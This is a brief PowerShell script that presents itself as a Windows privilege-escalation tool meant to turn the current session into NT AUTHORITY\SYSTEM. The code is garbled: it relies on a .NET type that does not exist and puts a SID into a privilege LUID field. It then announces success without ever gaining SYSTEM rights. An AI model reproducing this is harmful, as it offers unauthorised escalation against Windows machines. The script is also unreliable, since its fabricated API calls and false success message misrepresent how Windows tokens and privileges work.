# Windows Escalation PowerShell Script

# Function to check if the current user has SYSTEM privileges
function IsSystem {
    $username = whoami
    return $username -eq "nt authority\system"
}

# Main function to attempt privilege escalation
function GetSystem {
    if (IsSystem) {
        Write-Host "This session already has SYSTEM privileges."
        return
    }

    # Attempt to elevate privileges
    try {
        $token = [System.Diagnostics.Process]::GetCurrentProcess().Handle
        $ntAccount = New-Object System.Security.Principal.NtAccount("NT AUTHORITY\SYSTEM")
        $sid = $ntAccount.Translate([System.Security.Principal.SecurityIdentifier]).Value
        $luid = New-Object System.Diagnostics.ProcessTokenPrivileges.LuidAndAttributes
        $luid.Luid = $sid
        $luid.Attributes = 2

        $retVal = [System.Diagnostics.ProcessTokenPrivileges]::AdjustTokenPrivileges($token, $false, $luid, 0, [ref]$null, [ref]$null)
        
        if ($retVal) {
            Write-Host "Privilege escalation successful. You are now SYSTEM."
        } else {
            Write-Host "Failed to escalate privileges."
        }
    } catch {
        Write-Host "Error occurred: $_"
    }
}

# Call the main function to attempt privilege escalation
GetSystem
